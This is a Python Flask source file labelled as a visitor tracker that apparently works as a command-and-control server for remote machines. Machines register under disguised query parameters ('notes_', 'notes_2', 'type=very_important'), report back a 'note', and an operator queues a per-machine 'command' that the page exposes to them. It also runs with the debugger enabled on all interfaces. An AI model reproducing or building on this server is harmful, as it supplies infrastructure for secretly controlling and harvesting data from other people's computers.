from flask import Flask, render_template, request
import sqlite3
import datetime
app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('visitor_data.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            id_pc TEXT NOT NULL,
            pc_owner TEXT,
            timestamp TEXT NOT NULL,
            command TEXT ,
            note TEXT
        );
    ''')
    conn.commit()
    conn.close()

def commands_go(id_pc,command):
    conn = sqlite3.connect('visitor_data.db')
    cursor = conn.cursor()
    cursor.execute('SELECT command FROM visitors WHERE id_pc = ?', (id_pc,))
    result = cursor.fetchone()

    if result:
        cursor.execute('''
            UPDATE visitors
            SET command = ?
            WHERE id_pc = ?
        ''', (command,  id_pc))
    conn.commit()
    conn.close()

def add_visitor_data(id_pc,pc_owner):
    current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    conn = sqlite3.connect('visitor_data.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO visitors (id_pc,pc_owner, timestamp)
        VALUES (?,?, ?);
    ''', (id_pc,pc_owner, current_time)) 
    conn.commit()
    conn.close()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        id_pc = request.form.get('id_pc')
        command = request.form.get('command')
        commands_go(id_pc, command)
    conn = sqlite3.connect('visitor_data.db')
    cursor = conn.cursor()
    pc_id = request.args.get('notes_')
    pc_owner=request.args.get('notes_2')

    if request.args.get('type') == 'very_important':
        cursor.execute('SELECT timestamp FROM visitors WHERE id_pc = ?', (pc_id,))
        result = cursor.fetchone()
        if not result:
            add_visitor_data(pc_id,pc_owner)
        else: 
            the_note=request.args.get('note')
            current_time=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            cursor.execute('''
            UPDATE visitors
            SET timestamp = ?, note = ?
            WHERE id_pc = ?
        ''', (current_time, the_note, pc_id))
            conn.commit()
                

    cursor.execute('SELECT * FROM visitors')
    visitors = cursor.fetchall()  
    conn.close()
    

    return render_template('index.html', visitors=visitors)

if __name__ == '__main__':
    init_db()
    app.run(debug=True,host='0.0.0.0')
